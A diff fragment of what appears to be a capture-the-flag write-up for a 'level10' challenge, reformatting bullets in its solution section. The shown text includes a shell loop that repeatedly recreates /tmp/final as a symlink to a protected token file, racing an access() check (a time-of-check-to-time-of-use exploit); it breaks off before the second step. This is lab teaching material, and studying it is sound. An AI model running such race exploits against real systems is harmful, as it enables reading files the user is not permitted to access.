@@ -76,11 +76,11 @@ Theorical steps:
 
 # Solution
 
-On a first terminal connected with ssh let's create the file that is going to be the symlink (`readlink -f token` to know the true path of token file):
+- On a first terminal connected with ssh let's create the file that is going to be the symlink (`readlink -f token` to know the true path of token file):
 ```bash
 while true; do rm -rf /tmp/final; touch /tmp/final; ln -sfn /home/user/level10/token /tmp/final; done
 ```
-We need to suppress and create a new file each time or the symlink will apply on `tmp/final` and will not pass the `access()` check again.
+	- We need to suppress and create a new file each time or the symlink will apply on `tmp/final` and will not pass the `access()` check again.
 
 - On a second ssh terminal let's execute level10 in a loop: 
 ```bash 
